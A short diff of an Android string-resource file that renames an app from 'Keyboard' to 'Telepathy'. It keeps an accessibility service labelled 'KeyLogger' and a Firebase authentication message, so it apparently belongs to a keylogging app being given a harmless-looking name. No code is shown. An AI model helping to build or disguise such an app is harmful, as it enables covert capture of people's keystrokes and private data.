@@ -1,5 +1,5 @@
 <resources>
-    <string name="app_name">Keyboard</string>
+    <string name="app_name">Telepathy</string>
     <string name="accessibility_service_label">KeyLogger</string>
     <string name="authentication_failed">Firebase authentication failed: %s</string>
 
